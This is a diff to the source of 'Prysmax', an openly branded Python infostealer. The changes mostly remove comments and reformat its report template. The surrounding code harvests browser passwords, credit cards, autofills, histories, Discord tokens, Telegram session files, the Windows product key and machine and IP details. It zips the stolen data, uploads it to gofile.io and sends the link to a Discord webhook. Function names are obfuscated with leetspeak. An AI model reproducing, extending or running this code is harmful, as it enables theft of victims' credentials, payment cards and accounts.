@@ -363,7 +363,6 @@ def getbroxk(br0W53rP47H5):
 
     embedp = DiscordEmbed(title='Prysmax | Passwords', description=f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaPasswords.txt]({filess[0]})", color=0x040101)
 
-    # Add embed author, thumbnail, fields, and footer
     embedp.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
     embedp.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')
 
@@ -380,7 +379,6 @@ def getbroxk(br0W53rP47H5):
     
     embedb = DiscordEmbed(title='Prysmax | Browsers Data', description=f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaBookmarks.txt]({filess[5]})")
 
-    # Add embed author, thumbnail, fields, and footer
     embedb.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
     embedb.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')
 
@@ -522,30 +520,29 @@ def machine_info():
      print('There was an error in obtaining the list of processes.')
      process_task = False
     with open(user+'\\AppData\\Local\\Temp\\Prysmax\\information.txt', 'w', encoding='utf-8') as archivo:
-        # Escribe información en el archivo
         archivo.write(f"""
                       
         ¡PRYSMAX STEALER!
         
     ╠       Network Info🌐                 
-    ╠  ╒  IP: {theip}
-    ╠   ╒  Country: {ip_country}
-    ╠    ╒  Region: {ip_region}
-    ╠      ╒  City: {ip_city}
-    ╠       ╒  Vpn: {ip_proxy}
-    ╠         ╒  ISP: {ip_isp}
+    ╠     IP: {theip}
+    ╠     Country: {ip_country}
+    ╠     Region: {ip_region}
+    ╠     City: {ip_city}
+    ╠     Vpn: {ip_proxy}
+    ╠      ISP: {ip_isp}
     ╠
     
     ╠     Machine Info 🖥 
-    ╠  ╒ Pc Name: {pc_name}
-    ╠    ╒ OS: {pc_os}
-    ╠     ╒ CPU: {pc_cpu}
-    ╠      ╒ HWID: {pc_hwid}
-    ╠       ╒ RAM: {pc_ram}
-    ╠        ╒ GPU: {pc_gpu}
-    ╠         ╒ Windows Key: {pc_key}
-    ╠           ╒  Antiviruses: {antivirus_name}
-                  ╒ List of process: {num_procesos}
+    ╠   Pc Name: {pc_name}
+    ╠   OS: {pc_os}
+    ╠   CPU: {pc_cpu}
+    ╠   HWID: {pc_hwid}
+    ╠   RAM: {pc_ram}
+    ╠   GPU: {pc_gpu}
+    ╠   Windows Key: {pc_key}
+    ╠   Antiviruses: {antivirus_name}
+        List of process: {num_procesos}
 
 """)
     tokens = []
@@ -587,7 +584,6 @@ def machine_info():
                                     if f"{token} | {platform}" not in tokens:
                                         tokens.append(token)
                                         with open(user+'\\AppData\\Local\\Temp\\Prysmax\\discord_tokens.txt', 'w', encoding='utf-8') as tokensfile:
-                                            # Escribe información en el archivo
                                             tokensfile.write(str(tokens))
                                             Discord = True
     exodus = False
@@ -611,7 +607,6 @@ def machine_info():
         tdata_session_zip = user + '\\AppData\\Roaming\\Telegram Desktop\\' + prysmax_tele + ".zip"
         hash_path = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'
 
-        # Creating folders
         os.makedirs(tdata_path + '\\connection_hash')
         os.makedirs(tdata_path + '\\map')
 
@@ -621,34 +616,25 @@ def machine_info():
             if os.path.isfile(file):
                 shutil.copy2(file, tdata_path + '\\map')
 
-        # Copying files
-        # If hash file has 15 letters
+
         files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
         for file in files16:
             if os.path.isfile(file):
                 shutil.copy2(file, tdata_path + '\\connection_hash')
 
-        # Archivation folders
         with ZipFile(tdata_session_zip, 'w') as zipObj:
-            # Iterate over all the files in directory
             for folderName, subfolders, filenames in os.walk(tdata_path + '\\map'):
                 for filename in filenames:
-                    # Create complete filepath of file in directory
                     filePath = os.path.join(folderName, filename)
-                    # Add file to zip
                     zipObj.write(filePath)
 
             for folderName, subfolders, filenames in os.walk(tdata_path + '\\connection_hash'):
                 for filename in filenames:
-                    # Create complete filepath of file in directory
                     filePath = os.path.join(folderName, filename)
-                    # Add file to zip
                     zipObj.write(filePath)
 
-        # Remove temporary folders
         shutil.rmtree(tdata_path + '\\connection_hash')
         shutil.rmtree(tdata_path + '\\map')  
-        # Rename the archive
         old_file = os.path.join(user + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
         new_file = os.path.join(user + '\\AppData\\Roaming\\Telegram Desktop\\', prysmax_tele + ".zip")
         os.rename(old_file, new_file)
@@ -676,16 +662,16 @@ def machine_info():
         
     response = requests.get('https://api.gofile.io/getServer')
     data = response.json()
-    server = data['data']['server']  # Extracting the server name from the response
+    server = data['data']['server']  
 
-    upload_url = f'https://{server}.gofile.io/uploadFile'  # Construct the upload URL
+    upload_url = f'https://{server}.gofile.io/uploadFile'  
     
     filex = user + '\\AppData\\Local\\Temp\\Prysmax.zip'
     
     with open(filex, 'rb') as f:
         files = {'file': ('Prysmax.zip', f)}
         upload_response = requests.post(upload_url, files=files)
-        uploadth = upload_response.json()  # Convert response to JSON after checking status
+        uploadth = upload_response.json() 
         link_download = uploadth["data"]["downloadPage"]
     whnetwork = DiscordWebhook(url=theapi2023, username="Prysmax Software", avatar_url="https://i.imgur.com/jJES3AX.png")
 
@@ -715,4 +701,6 @@ def machine_info():
 
     G47H3r411()
 
-machine_info()
+
+if __name__ == "__main__":
+    machine_info()
